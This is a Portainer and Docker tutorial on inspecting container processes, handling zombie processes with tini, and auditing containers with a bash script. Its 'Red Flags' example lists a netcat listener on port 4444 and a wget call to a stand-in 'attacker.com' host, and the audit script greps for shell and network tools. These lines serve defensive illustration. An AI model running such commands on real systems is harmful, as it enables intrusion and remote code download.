# How to View Running Processes Inside a Container in Portainer

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Portainer, Docker, Container, Debugging, DevOps

Description: Learn how to view the running processes inside a Docker container using Portainer's built-in top view, equivalent to running docker top.

## Introduction

Sometimes you need to see what processes are running inside a container - useful for debugging, verifying that only expected processes are running, or identifying runaway processes consuming resources. Portainer's container Stats view includes a list of running processes without needing to exec into the container.

## Prerequisites

- Portainer installed with a connected Docker environment
- A running container to inspect

## Step 1: Access the Stats View

1. Navigate to **Containers** in Portainer.
2. Click on a running container's name.
3. Click **Stats** on the container details page.

This view shows real-time container statistics and a table of running processes, similar to `docker top`.

## Step 2: Understanding the Process List

The process list is equivalent to `docker top`. The exact columns come from the Docker API / host `ps` output; a common default is:

```text
UID     PID     PPID    C    STIME   TTY   TIME       CMD
root    13642   13607   0    10:00   ?     00:00:00   nginx: master process nginx -g daemon off;
101     13685   13642   0    10:00   ?     00:00:01   nginx: worker process
101     13686   13642   0    10:00   ?     00:00:01   nginx: worker process
```

| Column | Description |
|--------|-------------|
| UID | User or UID running the process |
| PID | Process ID reported by Docker / `ps` |
| PPID | Parent process ID |
| C | CPU utilization field from `ps` output |
| STIME | Process start time |
| TTY | Controlling terminal, if any |
| TIME | CPU time used |
| CMD | Full command that started the process |

## Step 3: What to Look For

### Expected Processes

For example, a typical Nginx container should show a master process and one or more worker processes:
```text
root  13642  nginx: master process
101   13685  nginx: worker process
101   13686  nginx: worker process
```

### Unexpected Processes (Red Flags)

```text
1    root    /bin/sh                     ← Shell running (from exec session?)
45   root    nc -l 0.0.0.0 -p 4444       ← Reverse shell (security concern!)
50   root    wget http://attacker.com    ← Downloading something?
```

A production container should only run the processes its image was designed to run.

### Zombie Processes

```text
UID     PID     PPID    C    STIME   TTY   TIME       CMD
root    1234    1       0    10:00   ?     00:00:00   [my-app] <defunct>
```

`<defunct>` indicates a zombie process. In `ps` output that includes a status column, `Z` means zombie (process completed but parent hasn't collected its exit status). This often indicates a missing `init` process or improper signal handling.

## Step 4: Docker CLI Equivalent

```bash
# View processes in a container:

docker top my-container

# With ps options:
docker top my-container aux

# Example default output:
UID     PID    PPID   C    STIME   TTY   TIME       CMD
root    1234   1219   0    10:00   ?     00:00:00   nginx: master process
101     1256   1234   0    10:00   ?     00:00:01   nginx: worker process
```

## Step 5: Investigating High CPU Processes

If Portainer's Stats view shows high CPU but you don't know which process:

1. Open the **Stats** view in Portainer to confirm the container is busy.
2. Use the console or `docker exec` to run `ps aux` or `top` inside the container.
3. Note the PID from inside the container before inspecting `/proc`.

```bash
# Identify a busy process from inside the container:
docker exec my-container ps aux
docker exec my-container top -b -n 1 | head -20

# Get more details about a specific process (using its PID from inside the container):
docker exec my-container cat /proc/1234/status
docker exec my-container strace -p 1234   # Trace system calls if strace is available and ptrace is permitted
```

## Step 6: Process Investigation with Exec

For deeper investigation, combine the process list with Exec:

```bash
# Via Portainer console or docker exec:

# See all processes with resource usage:
ps aux

# See process tree:
ps axjf

# Find processes using a port:
ss -tlnp | grep :8080
# Or:
lsof -i :8080

# Check a specific process:
cat /proc/1/cmdline | tr '\0' ' '
cat /proc/1/environ | tr '\0' '\n'

# Monitor process CPU in real-time:
top -b -n 1 | head -20
```

## Step 7: Handling Zombie Processes

Zombie processes indicate the parent isn't reaping children. Fix with `--init`:

```yaml
# docker-compose.yml
services:
  app:
    image: myorg/myapp:latest
    init: true   # Use Docker's tini init process (PID 1)
    # tini properly reaps zombie processes
```

Or use `tini` directly in your Dockerfile:

```dockerfile
FROM ubuntu:22.04

# Install tini
RUN apt-get update && apt-get install -y tini

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["/app/my-app"]
```

## Step 8: Security Auditing with Process View

Use the process list for quick security audits:

```bash
#!/bin/bash
# audit-container-processes.sh
# Check for unexpected processes in containers

EXPECTED_PROCESSES=("nginx" "node" "python" "java")

for container in $(docker ps -q); do
    name=$(docker inspect --format '{{.Name}}' "$container")
    echo "=== Checking: ${name} ==="

    # Get running processes
    procs=$(docker top "$container" aux 2>/dev/null | tail -n +2)

    echo "${procs}"

    # Check for shells that shouldn't be there
    if echo "${procs}" | grep -E "(bash|sh|nc|wget|curl -X)" > /dev/null; then
        echo "⚠️  WARNING: Suspicious process in ${name}"
    fi
done
```

## Step 9: When the Process List Doesn't Work

If the process list is unavailable or empty:

- **Container is stopped**: `docker top` / Portainer process listing only works on running containers.
- **Container uses the host PID namespace**: The container shares the host PID namespace, so you'll see host processes instead of an isolated container-only list.
- **Windows container**: Docker's container `top` endpoint is only supported on Unix systems.
- **Portainer can't retrieve process data for that container**: Try `docker top <container>` on the Docker host to confirm whether the engine can return the process list.

## Conclusion

Portainer's container Stats view provides a quick window into the processes running inside your containers - essential for debugging performance issues, verifying container contents, auditing security, and identifying zombie processes. Combined with the exec console for deeper investigation, you have powerful tools for container introspection directly from the Portainer web interface.
